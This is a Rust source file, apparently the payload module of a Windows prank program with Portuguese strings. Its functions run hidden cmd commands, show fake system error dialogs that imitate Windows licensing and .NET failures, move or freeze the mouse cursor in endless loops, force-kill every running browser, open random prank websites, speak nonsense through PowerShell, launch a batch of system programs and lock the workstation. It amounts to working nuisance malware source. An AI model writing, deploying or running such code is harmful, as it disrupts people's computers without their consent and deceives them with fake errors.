use winapi::um::winuser::*;
use winapi::shared::windef::POINT;
use std::process::Command;
use alloc::ffi::CString;
use std::os::windows::process::CommandExt;
use rand::Rng;
use rand::prelude::{SliceRandom};
use winapi::shared::minwindef::UINT;


// used to make new ones
pub fn execute_command(command: &str) -> String {
    let mut output = Command::new("cmd");
    output.creation_flags(0x8000000);
    let output = output
        .args(["/C", command])
        .output()
        .unwrap();
    String::from_utf8_lossy(&output.stdout).to_string()
}

fn msgbox(desc: &str, caption: &str, structure: UINT) {
    let message= CString::new(desc).unwrap();
    let title= CString::new(caption).unwrap();
    unsafe {
        MessageBoxA(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            structure,
        );
    }
}

fn site(url: &str) {
    let site = format!("start {}", url);
    let _ = execute_command(&site);
}

fn lmgtfy(keywords: &str) {
    let url = format!("https://letmegooglethat.com/?q={}", keywords.replace(" ", "%20"));
    let _ = site(&url);
}

fn speak(phrase: &str) {
    let command =  format!("Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{}');", phrase);
    let _child = Command::new("powershell")
        .args(["/C", &command])
        .output()
        .unwrap();
}
// used to make new ones

pub fn weird_msgbox() {
    let message = String::from("👨‍⚕️👩‍⚕️👨‍🚀👩‍🚀👨‍🚒👩‍🚒👨‍🎨👩‍🎨👨‍🔬👩‍🔬👨‍🔧👩‍🔧👨‍💼👩‍💼👨‍💻👩‍💻👨‍🏭👩‍🏭👨‍🏫👩‍🏫👨‍🎤👩‍🎤👨‍🎓👩‍🎓👨‍🍳👩‍🍳👨‍🌾👩‍🌾💂‍♂️💂‍♀️🕵️‍♂️🕵️‍♀️👮‍♂️👮‍♀️👷‍♂️👷‍♀️🤴👸🤵👰👳‍♂️👳‍♀️👲👵👴🧑👩👦👶👅👃👂👀🦴🦺🦹🦸🧕👳‍♂️👳‍♀️👲💪🤙👋🖐️🖕🦾✍️🦷💅🦵🦶👄👩‍🦱👨‍🦱👨‍🦰👩‍🦰👨‍🦳👩‍🦳👩‍🦲👨‍🦲🦸🦹🦺👨‍🦯👩‍🦯👨‍🦼👩‍🦼👨‍🦽👩‍🦽👨‍🦱👩‍🦱👨‍🦰👩‍🦰👨‍🦳👩‍🦳👨‍🦲👩‍🦲👨‍🦯👩‍🦯👨‍🦼👩‍🦼👨‍🦽👩‍🦽👨‍❤️‍👨👩‍❤️‍👩👨‍❤️‍👩👩‍❤️‍👨💏👩‍❤️‍💋‍👨💋👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨❤");
    let title = String::from("😀😃😄😁😆😅🤣😂🙂🙃😉😊😇🥰😍🤩😘😗😚😙😋😛😝😜🤪🤔🤨🧐🤓😎🤠🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲😴🤤😪😵🤐🥴🥱😷🤒🤕🤢🤮🤧🥵🥶🥺👿💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾👐🙌👏🤝👍👎👊✊️🤛🤜🤞✌️🤘👌👈👉👆👇☝️✋🤚🖐️🖖👋🤙💪🦾🖕✍️💅🦷👄🦵🦶🦸🦹🦺🦴👀👁️🧠🦷👂👃👅👶👦👧🧒👩🧑👨👴👵👲👳‍♀️👳‍♂️🧕👰🤵👸🤴👷‍♀️👷‍♂️👮‍♀️👮‍♂️🕵️‍♀️🕵️‍♂️💂‍♀️💂‍♂️👩‍🌾👨‍🌾👩‍🍳👨‍🍳👩‍🎓👨‍🎓👩‍🎤👨‍🎤👩‍🏫👨‍🏫👩‍🏭👨‍🏭👩‍💻");
    msgbox(&message, &title, MB_YESNOCANCEL | MB_ICONQUESTION)
}

pub fn error_msgbox() {
    let error_boxes = vec![
        (String::from("The following information was found for this error:\n\nCode 0xC004F063\n\nDescription:\nThe Software Licensing Service reported that the computer BIOS is missing a required license"), String::from("Error Details")),
        (String::from("We are not sure what happened, but we are unable to run this tool on your computer. If you continue experiencing problems, reference the error code when contacting customer support.\n\nError Code 0x80072F8F"), String::from("There was a problem running this tool")),
        (String::from("Error code: 0x80072f8f\n\nUnhandled exception has occurred in your application.\nIf you click Retry, the application will ignore this error and attempt to continue. If you click Cancel, the application will close immediately.\n\nCould not find file 'C:\\Windows\\System32\\Config\\SYSTEM'"), String::from("Microsoft .NET Framework Error"))
    ];
    if let Some(selected_tuple) = error_boxes.choose(&mut rand::thread_rng()) {
        let (message, title) = selected_tuple;
        msgbox(&message, &title, MB_RETRYCANCEL | MB_ICONERROR)
    }
}

pub fn jiggly_mouse() {
    let mut cursor_coords = POINT { x: 0, y: 0 };
    let mut old_cursor_coords = cursor_coords;
    let mut rng = rand::thread_rng();

    loop {
        unsafe{GetCursorPos(&mut cursor_coords);};
        let rand_x = rng.gen_range(-3..=3);
        let rand_y = rng.gen_range(-3..=3);
        if cursor_coords.x != old_cursor_coords.x || cursor_coords.y != old_cursor_coords.y {
            unsafe{SetCursorPos(cursor_coords.x+rand_x, cursor_coords.y+rand_y)};
            unsafe{GetCursorPos(&mut cursor_coords);}
            old_cursor_coords = cursor_coords
        } else {
            unsafe{SetCursorPos(cursor_coords.x+rand_x, cursor_coords.y+rand_y)};
            unsafe{SetCursorPos(cursor_coords.x, cursor_coords.y)};
        }
    }

}

pub fn stuck_mouse() {
    let mut cursor_coords = POINT { x: 0, y: 0 };
    unsafe{GetCursorPos(&mut cursor_coords);};

    loop {
        unsafe { SetCursorPos(cursor_coords.x, cursor_coords.y) };
    }

}

pub fn kill_browser() {
    let mut target_names = vec![
        "chrome.exe",
        "microsoftedge.exe",
        "msedge.exe",
        "firefox.exe",
        "opera.exe",
        "iexplore.exe",
        "brave.exe",
        "chromium.exe",
        "browser.exe",
        "avastsecurebrowser.exe",
        "avastbrowser.exe"
    ];
    for line in execute_command("tasklist").lines().skip(2) {
        let columns: Vec<&str> = line.split_whitespace().collect();
        if columns.len() >= 2 {
            let name = columns[0];

            // Gets the index of the name into i variable if name in vector
            if let Some(i) = target_names.iter().position(|&x| x == &name.to_lowercase()) {
                target_names.remove(i);
                let taskkill_command = String::from("taskkill -f -im ")+name;
                execute_command(&taskkill_command);
            }

        }

    }
}

pub fn rand_site() {
    let site_vec = vec![
        "https://bigrat.monster",
        "https://zoomquilt.org",
        "https://puginarug.com",
        "https://hooooooooo.com",
        "https://thatsthefinger.com",
        "http://burymewithmymoney.com",
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://newcp.net"
    ];
    if let Some(selected_site) = site_vec.choose(&mut rand::thread_rng()) {
        site(selected_site)
    }
}

pub fn rand_lmgtfy() {
    let search_vec = vec![
        "Como eu chego em casa?",
        "Os aliens são reais?",
        "Homens possuem mamilos?",
        "A fada do dente é real?",
        "Os porcos suam?",
        "A Terra é plana?",
        "Minhocas tem olhos?",
        "Posso me casar com meu primo?"
    ];
    if let Some(selected_search) = search_vec.choose(&mut rand::thread_rng()) {
        lmgtfy(selected_search)
    }
}

pub fn rand_speak() {
    let speak_vec = vec![
        "ja conheceu o barulho de um regador automatico? mais ou menos assim. thisststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststststst",
        "oioioioioioioioioiooioioioioioioioioiooioioioioioioioioiooioioioioioioioioio",
        ":a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a: :a:",
        "fãz umã pãlhãçãdinhã prã min liminhã õrlãr pãrlhãrçõr cãrçãrõlãr, põderiãr mãndãr umãr pãrlhãrçãrdinhãr? eu ãmor ãr pãrlhãrçãrdinhãr ÃROÃRPÃREÃRRÃRAÃRÇÃRÃÃROÃROÃRNÃRCÃRLÃRUÃRIÃRDÃRARÃRÃRÃRÃRÃRÃRÃR",
        "9 99 9 999 9 999 99 9 9999 9 9999 999 99 99 9 999 99 9 999 9 999 99 9 9999 9 9999 999 99 99 9",
        "\\////\\\\\\//\\/\\\\\\////\\//////\\//\\\\\\\\///\\\\\\\\////\\\\\\//\\/\\\\\\////\\//////\\//\\\\\\\\///\\\\\\"
    ];
    if let Some(selected_speak) = speak_vec.choose(&mut rand::thread_rng()) {
        speak(selected_speak)
    }
}

pub fn bloat_start() {
    let programs = vec![
        String::from("notepad"),
        String::from("calc"),
        String::from("control"),
        String::from("explorer"),
        String::from("taskmgr"),
        String::from("msconfig"),
        String::from("mspaint"),
        String::from("mstsc")
    ];
    for program in programs {
        execute_command(&program);
    }
}

pub fn lock() {
    unsafe {
        LockWorkStation()
    };
}

